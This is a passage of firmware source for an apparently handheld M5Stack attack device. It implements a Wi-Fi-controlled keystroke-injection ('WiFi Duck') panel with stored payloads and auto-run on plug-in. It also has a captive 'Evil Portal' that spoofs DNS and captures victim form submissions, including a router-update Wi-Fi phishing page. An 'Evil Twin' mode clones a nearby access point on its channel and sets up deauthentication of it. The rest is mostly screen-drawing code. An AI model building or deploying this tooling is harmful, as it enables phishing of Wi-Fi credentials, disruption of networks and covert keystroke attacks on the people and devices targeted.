    : "<div class=\"warn\">&#9888;&#65039; This firmware was built without USB-OTG (TinyUSB), so the keyboard is disabled &mdash; scripts run but nothing is typed. Rebuild with <code>USBMode=default</code> to enable HID.</div>";

  return
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + attrEsc(duckSsid) + " :: WiFi Duck</title><style>" + css + "</style></head><body>"
    "<div class=\"top\"><h1>&#128038; WiFi Duck &mdash; Portal Evil HUEBR</h1><p>DuckyScript over Wi-Fi &middot; US keyboard layout</p></div>"
    "<div class=\"wrap\">"
    + warn +
    "<div class=\"card\">"
    "<div class=\"row\" style=\"justify-content:space-between\">"
    "<div class=\"sec\" style=\"margin:0\">Payload</div>"
    "<div class=\"st\"><span id=\"dot\" class=\"dot\"></span><span id=\"stat\">Idle</span></div></div>"
    "<textarea id=\"s\" spellcheck=\"false\" placeholder=\"REM your DuckyScript here\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\"></textarea>"
    "<div class=\"bar\">"
    "<button class=\"btn primary\" onclick=\"run()\">&#9654; Run</button>"
    "<button class=\"btn stop\" onclick=\"stop()\">&#9632; Stop</button>"
    "<label class=\"st\" style=\"margin-left:auto\"><input type=\"checkbox\" id=\"au\" onchange=\"setauto()\"> Auto-exec on start</label>"
    "</div>"
    "<p class=\"hint\" id=\"auh\">When on, the device runs the default payload automatically the moment the WiFi Duck starts (or a host is plugged in).</p>"
    "</div>"

    "<div class=\"card\">"
    "<div class=\"sec\">Saved payloads</div>"
    "<div class=\"row\">"
    "<select id=\"sel\"></select>"
    "<button class=\"btn primary\" onclick=\"runsaved()\">&#9654; Run</button>"
    "<button class=\"btn\" onclick=\"load()\">Load to editor</button>"
    "<button class=\"btn stop\" onclick=\"del()\">Delete</button>"
    "</div>"
    "<div class=\"row\" style=\"margin-top:10px\">"
    "<input id=\"nm\" placeholder=\"name (letters, digits, - _)\">"
    "<button class=\"btn\" onclick=\"save()\">&#128190; Save editor as...</button>"
    "</div>"
    "<p class=\"hint\">The last script you Run is also stored as <code>payload</code> (the default used by Auto-exec and the device's front button).</p>"
    "</div>"

    "<div class=\"card\">"
    "<div class=\"sec\">Payload library</div>"
    "<div class=\"row\" style=\"margin-bottom:10px\"><select id=\"cat\" onchange=\"renderlib()\"></select>"
    "<span class=\"hint\" style=\"margin:0\">Built-in demos &mdash; Load to edit, or Run directly.</span></div>"
    "<div id=\"lib\"></div>"
    "</div>"

    "<div class=\"card\">"
    "<div class=\"sec\">Import / Export</div>"
    "<div class=\"bar\">"
    "<a class=\"btn\" href=\"/duck/export\">&#11015;&#65039; Export all (.duck)</a>"
    "<button class=\"btn\" onclick=\"doimport()\">&#11014;&#65039; Import bundle</button>"
    "</div>"
    "<textarea id=\"imp\" style=\"min-height:90px;margin-top:10px\" spellcheck=\"false\" placeholder=\"Paste a .duck bundle here (sections like: === name ===) then press Import\"></textarea>"
    "<p class=\"hint\" id=\"imph\">Export downloads every saved payload as one file; Import restores them.</p>"
    "</div>"

    "<div class=\"card\">"
    "<div class=\"sec\">DuckyScript reference</div>"
    "<div class=\"grid\">"
    "<div><code class=\"k\">REM</code> <i>text</i> &mdash; comment</div><div><code class=\"k\">DELAY</code> <code>ms</code> &mdash; pause</div>"
    "<div><code class=\"k\">STRING</code> <code>text</code> &mdash; type text</div><div><code class=\"k\">STRINGLN</code> <code>text</code> &mdash; type + Enter</div>"
    "<div><code class=\"k\">DEFAULTDELAY</code> <code>ms</code> &mdash; gap between lines</div><div><code class=\"k\">REPEAT</code> <code>n</code> &mdash; repeat last line</div>"
    "<div><code class=\"k\">DELAY</code> <code>200-800</code> &mdash; random pause in range</div><div><code class=\"k\">DEFINE</code> <code>#NAME</code> <i>value</i> &mdash; constant</div>"
    "<div><code class=\"k\">VAR</code> <code>$x</code> = <i>value</i> &mdash; variable</div><div>Use <code>$x</code> / <code>#NAME</code> inside <code>STRING</code> &mdash; substituted</div>"
    "<div>Modifiers: <code>GUI</code>/<code>WINDOWS</code> <code>CTRL</code> <code>ALT</code> <code>SHIFT</code></div><div>Combos: <code>GUI r</code>, <code>CTRL ALT DELETE</code>, <code>CTRL SHIFT ESC</code></div>"
    "<div>Keys: <code>ENTER</code> <code>TAB</code> <code>ESC</code> <code>SPACE</code> <code>BACKSPACE</code> <code>DELETE</code></div><div>Nav: <code>UP</code> <code>DOWN</code> <code>LEFT</code> <code>RIGHT</code> <code>HOME</code> <code>END</code> <code>PAGEUP</code> <code>PAGEDOWN</code></div>"
    "<div>Function: <code>F1</code> .. <code>F12</code> <code>CAPSLOCK</code> <code>INSERT</code></div><div>Each line = keys pressed together, then released.</div>"
    "</div>"
    "<p class=\"hint\">Keyboard layout is <b>US (QWERTY)</b>. On a target set to another layout, some symbols/accented characters may differ.</p>"
    "<p class=\"hint\">On the device: <b>tap the side button</b> to cycle the armed saved payload, <b>front button</b> to fire it, <b>hold the side button</b> to exit.</p>"
    "</div>"

    "<script>"
    "var S=document.getElementById('s'),ST=document.getElementById('stat'),D=document.getElementById('dot'),AU=document.getElementById('au');"
    "var LIB=[];"
    "function post(u,b){return fetch(u,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});}"
    "function enc(o){return Object.keys(o).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(o[k])).join('&');}"
    "function run(){post('/duck/run',enc({script:S.value})).then(poll);}"
    "function stop(){fetch('/duck/stop').then(poll);}"
    "function runsaved(){var n=document.getElementById('sel').value;if(n)fetch('/duck/runsaved?name='+encodeURIComponent(n)).then(poll);}"
    "function save(){var n=document.getElementById('nm').value||'payload';post('/duck/save',enc({name:n,script:S.value})).then(()=>list());}"
    "function del(){var n=document.getElementById('sel').value;if(n)fetch('/duck/del?name='+encodeURIComponent(n)).then(()=>list());}"
    "function load(){var n=document.getElementById('sel').value;if(n)fetch('/duck/load?name='+encodeURIComponent(n)).then(r=>r.text()).then(t=>{S.value=t;});}"
    "function library(){fetch('/duck/library').then(r=>r.json()).then(a=>{LIB=a;var c=document.getElementById('cat'),cats=[];a.forEach(p=>{if(cats.indexOf(p.c)<0)cats.push(p.c);});c.innerHTML='';cats.forEach(x=>{var o=document.createElement('option');o.value=o.textContent=x;c.appendChild(o);});renderlib();});}"
    "function renderlib(){var c=document.getElementById('cat').value,box=document.getElementById('lib');box.innerHTML='';LIB.filter(p=>p.c===c).forEach(p=>{"
    "var d=document.createElement('div');d.className='row';d.style.border='1px solid var(--line)';d.style.borderRadius='9px';d.style.padding='9px 11px';d.style.marginBottom='8px';"
    "var info=document.createElement('div');info.style.flex='1';info.style.minWidth='160px';"
    "var nm=document.createElement('b');nm.textContent=p.n;var ds=document.createElement('div');ds.className='hint';ds.style.margin='2px 0 0';ds.textContent=p.d;info.appendChild(nm);info.appendChild(ds);"
    "var lb=document.createElement('button');lb.className='btn';lb.textContent='Load';lb.onclick=function(){S.value=p.s;window.scrollTo(0,0);};"
    "var rb=document.createElement('button');rb.className='btn primary';rb.textContent='\\u25B6 Run';rb.onclick=function(){S.value=p.s;run();};"
    "d.appendChild(info);d.appendChild(lb);d.appendChild(rb);box.appendChild(d);});}"
    "function doimport(){var b=document.getElementById('imp').value;if(!b)return;post('/duck/import',enc({bundle:b})).then(r=>r.json()).then(j=>{document.getElementById('imph').textContent='Imported '+j.count+' payload(s).';document.getElementById('imp').value='';list();});}"
    "function setauto(){fetch('/duck/autorun?on='+(AU.checked?'1':'0'));}"
    "function list(){fetch('/duck/list').then(r=>r.json()).then(a=>{var s=document.getElementById('sel');s.innerHTML='';a.forEach(n=>{var o=document.createElement('option');o.value=o.textContent=n;s.appendChild(o);});});}"
    "function poll(){fetch('/duck/status').then(r=>r.json()).then(j=>{ST.textContent=j.busy?('Running '+j.done+'/'+j.total):(j.hid?j.msg:'HID disabled');D.className='dot'+(j.busy?' run':'');AU.checked=j.autorun;});}"
    "list();library();setInterval(poll,1000);poll();"
    "</script>"
    "</div></body></html>";
}

// -------- WiFi Duck LCD screen (240x135, blood theme) --------

void drawDuckScreenStatus();  // fwd

void drawDuckScreen() {
  M5.Lcd.fillScreen(C_BG);
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("WIFI DUCK", 112, 13);
  drawStatusDot(true);

  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("AP SSID", 8, 31);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(duckSsid, 8, 41);

  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Pass", 8, 61);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(duckPass, 44, 61);
  // Access: join the WPA2 AP above, then open the control panel at the gateway.
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Panel", 8, 73);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + APIP.toString() + "/", 44, 73);
#if !DUCK_HID
  M5.Lcd.setTextColor(C_DANGER, C_BG);  M5.Lcd.drawString("HID OFF - rebuild USB-OTG", 8, 85);
#endif

  drawDuckScreenStatus();
  drawBloodFrame();
}

// Status card + live battery (redrawn each tick without a full repaint).
void drawDuckScreenStatus() {
  M5.Lcd.fillRoundRect(8, 97, 224, 31, 8, C_CARD);
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("STATUS", 16, 103);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(duckBusy ? C_COUNT : C_OK, C_CARD);
  String st = duckBusy ? ("RUN " + String(duckLinesDone) + "/" + String(duckLinesTotal))
                       : duckStatusMsg;
  if (st.length() > 10) st = st.substring(0, 10);
  M5.Lcd.drawString(st, 16, 113);

  // Armed payload (what BtnA fires); BtnB taps cycle it.
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextDatum(TR_DATUM);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("ARMED " + String(duckArmedSlot + 1) + "/" + String(duckSlotCount), 224, 102);
  String an = (duckSlotCount > 0) ? duckSlotName[duckArmedSlot] : String("payload");
  if (an.length() > 13) an = an.substring(0, 12) + "~";
  M5.Lcd.setTextColor(C_ACCENT2, C_CARD);
  M5.Lcd.drawString(an, 224, 115);
  M5.Lcd.setTextDatum(TL_DATUM);

  drawBatteryAt(210, 38, C_MUTED, C_BG);   // keep the battery reading current
}

// Bring up the WiFi Duck AP (WPA2) + web control panel, and show its screen.
void startDuck() {
  activeProject = PROJ_DUCK;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(duckSsid.c_str(), duckPass.c_str());   // WPA2-protected
  dnsServer.start(DNS_PORT, "*", APIP);              // captive-style: any URL -> panel
  webServer.begin();
  duckUp = true;

  appState = ST_DUCK_RUNNING;
  duckBusy = false;
  duckStatusMsg = "Idle";
  duckLoadSlots();        // populate the on-device arming slots from saved payloads
  drawDuckScreen();
  lastTick = millis();

  // Auto-exec: fire the saved default payload as soon as the Duck comes up.
  if (duckAutorun) {
    String s = duckReadFile(DUCK_DEFAULT);
    if (s.length()) { duckStartScript(s); drawDuckScreenStatus(); }
  }
}

// Tear the WiFi Duck down and hand the web server back to the portal side.
void stopDuck() {
  if (duckUp) {
    dnsServer.stop();
    webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    duckUp = false;
  }
  duckStop();
  activeProject = PROJ_PORTAL;
}

// Register HTTP routes once. Handlers are safe to attach before the AP is up;
// this runs a single time from setup() so repeated start/stop cycles don't
// stack duplicate handlers.
void registerRoutes() {
  // Victim-facing: capture a submission (no auth).
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());  // addCapture() bumps the counters
    if (laughOn || twinActive) playLaugh();   // evil laugh on every capture (always in twin mode)
    else if (soundOn) M5.Speaker.tone(4000, 60);
    if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
  });

  // Operator-facing: all gated behind the login when it is enabled.
  webServer.on("/admin", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.on("/export.csv", []() {
    if (!requireAuth()) return;
    sendCsvExport();   // streams the full history from flash
  });
  webServer.on("/export.json", []() {
    if (!requireAuth()) return;
    sendJsonExport();  // streams the full history from flash
  });
  webServer.on("/settings", HTTP_GET, []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", settingsPage(false));
  });
  webServer.on("/settings", HTTP_POST, []() {
    if (!requireAuth()) return;
    bool restartAp = applySettings();
    webServer.send(HTTP_CODE, "text/html", settingsPage(true));
    if (restartAp) {  // SSID changed -- reply is out, now cycle the AP
      delay(200);
      WiFi.softAPdisconnect(true);
      WiFi.softAP(cfgSsid.c_str());
    }
  });

  // ---- WiFi Duck control panel (operator-only; AP is WPA2-protected) ----
  webServer.on("/duck/run", HTTP_POST, []() {
    if (!requireAuth()) return;
    String s = webServer.arg("script");
    duckWriteFile(DUCK_DEFAULT, s);   // remember the last run as the default
    duckStartScript(s);
    if (appState == ST_DUCK_RUNNING) drawDuckScreenStatus();
    webServer.send(HTTP_CODE, "application/json", "{\"ok\":true}");
  });
  webServer.on("/duck/stop", []() {
    if (!requireAuth()) return;
    duckStop();
    webServer.send(HTTP_CODE, "application/json", "{\"ok\":true}");
  });
  webServer.on("/duck/save", HTTP_POST, []() {
    if (!requireAuth()) return;
    bool ok = duckWriteFile(duckPathFor(webServer.arg("name")), webServer.arg("script"));
    webServer.send(HTTP_CODE, "application/json", String("{\"ok\":") + (ok ? "true" : "false") + "}");
  });
  webServer.on("/duck/load", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/plain", duckReadFile(duckPathFor(webServer.arg("name"))));
  });
  webServer.on("/duck/runsaved", []() {       // run a saved payload directly (no load)
    if (!requireAuth()) return;
    String s = duckReadFile(duckPathFor(webServer.arg("name")));
    if (s.length()) duckStartScript(s);
    if (appState == ST_DUCK_RUNNING) drawDuckScreenStatus();
    webServer.send(HTTP_CODE, "application/json", String("{\"ok\":") + (s.length() ? "true" : "false") + "}");
  });
  webServer.on("/duck/autorun", []() {         // toggle auto-exec on Duck start
    if (!requireAuth()) return;
    duckAutorun = (webServer.arg("on") == "1");
    saveSettings();
    webServer.send(HTTP_CODE, "application/json", String("{\"autorun\":") + (duckAutorun ? "true" : "false") + "}");
  });
  webServer.on("/duck/del", []() {
    if (!requireAuth()) return;
    LittleFS.remove(duckPathFor(webServer.arg("name")));
    webServer.send(HTTP_CODE, "application/json", "{\"ok\":true}");
  });
  webServer.on("/duck/list", []() {
    if (!requireAuth()) return;
    sendDuckList();
  });
  webServer.on("/duck/library", []() {        // built-in payload catalog
    if (!requireAuth()) return;
    sendDuckLibrary();
  });
  webServer.on("/duck/export", []() {         // download all saved payloads as a bundle
    if (!requireAuth()) return;
    sendDuckExport();
  });
  webServer.on("/duck/import", HTTP_POST, []() {  // restore payloads from a bundle
    if (!requireAuth()) return;
    int c = duckImportBundle(webServer.arg("bundle"));
    webServer.send(HTTP_CODE, "application/json", String("{\"ok\":true,\"count\":") + c + "}");
  });
  webServer.on("/duck/status", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "application/json",
      String("{\"busy\":") + (duckBusy ? "true" : "false") +
      ",\"done\":"  + String(duckLinesDone) +
      ",\"total\":" + String(duckLinesTotal) +
      ",\"hid\":"   + String(DUCK_HID ? "true" : "false") +
      ",\"autorun\":" + String(duckAutorun ? "true" : "false") +
      ",\"msg\":"   + jsonStr(duckStatusMsg) + "}");
  });

  // Everything else: the WiFi Duck panel while the Duck is active, otherwise
  // the captive-portal login page.
  webServer.onNotFound([]() {
    if (activeProject == PROJ_DUCK) {
      if (!requireAuth()) return;
      webServer.send(HTTP_CODE, "text/html", duckPanel());
    } else if (twinActive) {
      webServer.send(HTTP_CODE, "text/html", twinIndex());  // router-update Wi-Fi phish
    } else {
      webServer.send(HTTP_CODE, "text/html", index());
    }
  });
}

// Bring the captive-portal AP + DNS + web server up and switch to the
// live dashboard.
void startPortal() {
  activeProject = PROJ_PORTAL;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(cfgSsid.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (HTTP only)
  webServer.begin();
  portalStarted = true;

  appState = ST_RUNNING;
  showQR = false;
  drawMainScreen();
  previous = capcount;  // avoid an immediate redraw on the first loop tick
  dotOn = true;
  lastTick = millis();
}

// Tear the portal down and go back to idle (used when returning to the menu).
void stopPortal() {
  if (portalStarted) {
    dnsServer.stop();
    webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    portalStarted = false;
  }
  twinActive = false;   // leaving the portal also ends any evil-twin deauth
  showQR = false;
  blinkRemaining = 0;
  ledWrite(false);  // LED off (no-op when LED_PIN < 0)
}

// -------- Evil Twin: scan, pick a target, clone + deauth --------

// Scan 2.4GHz for nearby APs and keep up to MAX_SCAN cloneable (named) ones.
void scanNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false);
  delay(80);
  int n = WiFi.scanNetworks(false, true);   // blocking, include hidden
  scanCount = 0;
  for (int i = 0; i < n && scanCount < MAX_SCAN; i++) {
    String s = WiFi.SSID(i);
    if (s.length() == 0) continue;           // can't clone a hidden / blank SSID
    scanSsid[scanCount] = s;
    uint8_t *b = WiFi.BSSID(i);
    if (b) memcpy(scanBssid[scanCount], b, 6);
    scanCh[scanCount]   = (uint8_t)WiFi.channel(i);
    scanRssi[scanCount] = (int8_t)WiFi.RSSI(i);
    scanEnc[scanCount]  = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
    scanCount++;
  }
  WiFi.scanDelete();
}

#define SCAN_VIS 5   // network rows visible at once (the list scrolls)

// Render the target-picker list (networks + Rescan + Back).
void drawScanMenu() {
  fillBgBand(0, 135);
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
  M5.Lcd.drawFastHLine(0, 26, 240, C_CARD_SH);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("SELECT TARGET", 8, 13);
  drawBatteryAt(206, 6, TFT_WHITE, C_HDR_TOP);

  int total = scanCount + 2;                  // + Rescan + Back
  if (scanSel < scanTop)             scanTop = scanSel;
  if (scanSel >= scanTop + SCAN_VIS) scanTop = scanSel - SCAN_VIS + 1;

  if (scanCount == 0) {
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(C_MUTED, C_BG);
    M5.Lcd.setTextDatum(ML_DATUM);
    M5.Lcd.drawString("No networks found.", 12, 34);
  }

  const int y0 = 30, rowH = 19;
  for (int r = 0; r < SCAN_VIS; r++) {
    int idx = scanTop + r;
    if (idx >= total) break;
    int y  = y0 + r * rowH;
    int yc = y + 8;
    bool sel = (idx == scanSel);
    uint16_t body = sel ? C_ACCENT : C_CARD;
    uint16_t fg   = sel ? TFT_WHITE : C_MUTED;
    M5.Lcd.fillRoundRect(6, y, 228, rowH - 3, 4, body);
    if (sel) M5.Lcd.drawRoundRect(6, y, 228, rowH - 3, 4, C_ACC_HI);
    M5.Lcd.setTextSize(1);
    if (idx < scanCount) {
      String s = scanSsid[idx];
      if (s.length() > 15) s = s.substring(0, 14) + "~";
      M5.Lcd.setTextDatum(ML_DATUM);
      M5.Lcd.setTextColor(fg, body);
      M5.Lcd.drawString(s, 12, yc);
      String meta = String("ch") + (int)scanCh[idx] + " " + (int)scanRssi[idx] + (scanEnc[idx] ? " #" : " o");
      M5.Lcd.setTextDatum(MR_DATUM);
      M5.Lcd.setTextColor(sel ? TFT_WHITE : C_MUTED, body);
      M5.Lcd.drawString(meta, 228, yc);
    } else {
      M5.Lcd.setTextDatum(ML_DATUM);
      M5.Lcd.setTextColor(fg, body);
      M5.Lcd.drawString(idx == scanCount ? "Rescan" : "Back", 12, yc);
    }
  }

  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED);
  M5.Lcd.setTextDatum(BL_DATUM);
  M5.Lcd.drawString("B:move  A:select", 6, 134);
  M5.Lcd.setTextDatum(BR_DATUM);
  M5.Lcd.drawString(String(scanSel + 1) + "/" + String(total), 234, 134);
  drawBloodFrame();
}

// Show a brief "scanning" splash, run the scan, then show the picker.
void runScan() {
  fillBgBand(0, 135);
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("SELECT TARGET", 8, 13);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
  M5.Lcd.drawString("Scanning Wi-Fi...", 120, 74);
  drawBloodFrame();
  scanNetworks();
  scanSel = 0; scanTop = 0;
  drawScanMenu();
}

// Enter the Evil Twin target picker.
void enterScan() {
  appState = ST_MENU_SCAN;
  runScan();
}

// Clone the chosen AP (open, same SSID + channel) and start deauthing it.
void startTwin(int idx) {
  twinSSID = scanSsid[idx];
  memcpy(twinBSSID, scanBssid[idx], 6);
  twinChannel = scanCh[idx] ? scanCh[idx] : 1;
  twinDeauthCount = 0;
  twinActive = true;

  activeProject = PROJ_PORTAL;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(twinSSID.c_str(), NULL, twinChannel);   // open clone on the target channel
  esp_wifi_set_channel(twinChannel, WIFI_SECOND_CHAN_NONE);  // lock TX to the target channel
  dnsServer.start(DNS_PORT, "*", APIP);               // DNS spoofing (HTTP only)
  webServer.begin();
  portalStarted = true;

  appState = ST_RUNNING;
  showQR = false;
  drawMainScreen();
  previous = capcount;   // avoid an immediate redraw on the first loop tick
  dotOn = true;
  lastTick = millis();
  lastDeauth = millis();
}

// Buttons for the target picker (BtnB scrolls, BtnA selects).
void handleScanButtons() {
  static bool backArmed = false;
  if (M5.BtnB.pressedFor(600)) {   // hold = back to the Evil Portal menu
    if (!backArmed) { backArmed = true; WiFi.mode(WIFI_OFF); appState = ST_MENU_PORTAL; menuSel = 1; drawMenu(true); }
    return;
  }
  int total = scanCount + 2;
  if (M5.BtnB.wasReleased()) {
    if (backArmed) { backArmed = false; return; }
    scanSel = (scanSel + 1) % total;
    drawScanMenu();
  }
  if (M5.BtnA.wasPressed()) {
    if (scanSel < scanCount)       { startTwin(scanSel); }        // -> ST_RUNNING (twin)
    else if (scanSel == scanCount) { runScan(); }                 // Rescan
    else { WiFi.mode(WIFI_OFF); appState = ST_MENU_PORTAL; menuSel = 1; drawMenu(true); }
  }
}

// -------- Menu rendering + navigation --------

// Small vector glyphs drawn to the left of each menu row. (cx,cy) is the icon
// centre; `bg` is the row background, used for cut-outs.
enum { IC_TOOLS, IC_CONFIG, IC_POWER, IC_PLAY, IC_INFO, IC_TRASH, IC_TOGGLE, IC_BRIGHT, IC_FLIP, IC_BACK, IC_DUCK, IC_TWIN };
void drawMenuIcon(int t, int cx, int cy, uint16_t col, uint16_t bg) {
  switch (t) {
    case IC_TOOLS:                                       // sliders
      M5.Lcd.drawFastHLine(cx - 6, cy - 3, 12, col); M5.Lcd.fillRect(cx - 4, cy - 4, 3, 3, col);
      M5.Lcd.drawFastHLine(cx - 6, cy + 3, 12, col); M5.Lcd.fillRect(cx + 2, cy + 2, 3, 3, col);
      break;
    case IC_CONFIG:                                      // gear
      M5.Lcd.drawCircle(cx, cy, 4, col); M5.Lcd.fillCircle(cx, cy, 1, col);
      M5.Lcd.fillRect(cx - 1, cy - 6, 2, 2, col); M5.Lcd.fillRect(cx - 1, cy + 4, 2, 2, col);
      M5.Lcd.fillRect(cx - 6, cy - 1, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy - 1, 2, 2, col);
      break;
    case IC_POWER:                                       // power symbol
      M5.Lcd.drawCircle(cx, cy + 1, 5, col);
      M5.Lcd.fillRect(cx - 3, cy - 5, 7, 3, bg);
      M5.Lcd.drawFastVLine(cx, cy - 5, 6, col);
      break;
    case IC_PLAY:                                        // play triangle
      M5.Lcd.fillTriangle(cx - 3, cy - 5, cx - 3, cy + 5, cx + 5, cy, col);
      break;
    case IC_INFO:                                        // "i"
      M5.Lcd.fillCircle(cx, cy - 4, 1, col); M5.Lcd.fillRect(cx - 1, cy - 1, 2, 6, col);
      break;
    case IC_TRASH:                                       // bin
      M5.Lcd.fillRect(cx - 4, cy - 2, 8, 7, col); M5.Lcd.fillRect(cx - 5, cy - 4, 10, 2, col);
      M5.Lcd.fillRect(cx - 1, cy - 6, 2, 2, col);
      M5.Lcd.drawFastVLine(cx - 2, cy - 1, 5, bg); M5.Lcd.drawFastVLine(cx + 1, cy - 1, 5, bg);
      break;
    case IC_TOGGLE:                                      // pill switch
      M5.Lcd.drawRoundRect(cx - 6, cy - 3, 12, 6, 3, col); M5.Lcd.fillCircle(cx + 3, cy, 2, col);
      break;
    case IC_BRIGHT:                                      // sun
      M5.Lcd.fillCircle(cx, cy, 3, col);
      M5.Lcd.drawFastVLine(cx, cy - 6, 2, col); M5.Lcd.drawFastVLine(cx, cy + 5, 2, col);
      M5.Lcd.drawFastHLine(cx - 6, cy, 2, col); M5.Lcd.drawFastHLine(cx + 5, cy, 2, col);
      M5.Lcd.fillRect(cx - 5, cy - 5, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy - 5, 2, 2, col);
      M5.Lcd.fillRect(cx - 5, cy + 4, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy + 4, 2, 2, col);
      break;
    case IC_FLIP:                                        // rotate box
      M5.Lcd.drawRoundRect(cx - 5, cy - 5, 10, 10, 2, col);
      M5.Lcd.fillTriangle(cx - 5, cy - 5, cx - 1, cy - 5, cx - 5, cy - 1, col);
      M5.Lcd.fillTriangle(cx + 5, cy + 5, cx + 1, cy + 5, cx + 5, cy + 1, col);
      break;
    case IC_BACK:                                        // left arrow
      M5.Lcd.fillTriangle(cx - 4, cy, cx + 1, cy - 5, cx + 1, cy + 5, col);
      M5.Lcd.fillRect(cx + 1, cy - 1, 5, 2, col);
      break;
    case IC_DUCK:                                        // keyboard (WiFi Duck)
      M5.Lcd.drawRoundRect(cx - 7, cy - 4, 14, 9, 2, col);
      M5.Lcd.drawPixel(cx - 4, cy - 1, col); M5.Lcd.drawPixel(cx - 1, cy - 1, col);
      M5.Lcd.drawPixel(cx + 2, cy - 1, col); M5.Lcd.drawPixel(cx + 4, cy - 1, col);
      M5.Lcd.drawFastHLine(cx - 4, cy + 2, 8, col);      // space bar
      break;
    case IC_TWIN:                                       // broadcast arcs (evil twin)
      M5.Lcd.fillCircle(cx - 3, cy + 4, 2, col);
      M5.Lcd.drawCircle(cx - 3, cy + 4, 5, col);
      M5.Lcd.drawCircle(cx - 3, cy + 4, 8, col);
      M5.Lcd.fillRect(cx - 3, cy + 4, 12, 7, bg);        // mask the lower-right quadrant
      break;
  }
}

// -------- Depth / gradient helpers --------

// Fill a rectangle with a vertical gradient between two RGB565 colors.
void fillVGrad(int x, int y, int w, int h, uint16_t c1, uint16_t c2) {
  if (h < 1) return;
  int r1 = (c1 >> 11) & 0x1F, g1 = (c1 >> 5) & 0x3F, b1 = c1 & 0x1F;
  int r2 = (c2 >> 11) & 0x1F, g2 = (c2 >> 5) & 0x3F, b2 = c2 & 0x1F;
  int d = (h > 1) ? (h - 1) : 1;
  for (int i = 0; i < h; i++) {
    int r = r1 + (r2 - r1) * i / d, g = g1 + (g2 - g1) * i / d, b = b1 + (b2 - b1) * i / d;
    M5.Lcd.drawFastHLine(x, y + i, w, (uint16_t)((r << 11) | (g << 5) | b));
  }
}

// Paint a horizontal band of the full-screen background gradient (C_BG at the
// top -> C_BG2 at the bottom) so partial repaints stay seamless.
void fillBgBand(int y, int h) {
  int r1 = (C_BG >> 11) & 0x1F, g1 = (C_BG >> 5) & 0x3F, b1 = C_BG & 0x1F;
  int r2 = (C_BG2 >> 11) & 0x1F, g2 = (C_BG2 >> 5) & 0x3F, b2 = C_BG2 & 0x1F;
  for (int i = 0; i < h; i++) {
    int yy = y + i;
    if (yy < 0 || yy >= 135) continue;
    int r = r1 + (r2 - r1) * yy / 134, g = g1 + (g2 - g1) * yy / 134, b = b1 + (b2 - b1) * yy / 134;
    M5.Lcd.drawFastHLine(0, yy, 240, (uint16_t)((r << 11) | (g << 5) | b));
  }
}

// Live status line under the header on the main menu: portal state, captures
// and connected clients. Redrawn on its own each tick so it stays current.
void drawStatusStrip() {
  M5.Lcd.fillRect(8, 28, 224, 14, C_BG);   // clear inner area only (keep margin blood)
  int clients = portalStarted ? WiFi.softAPgetStationNum() : 0;
  M5.Lcd.fillCircle(12, 35, 3, portalStarted ? C_OK : C_DANGER);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
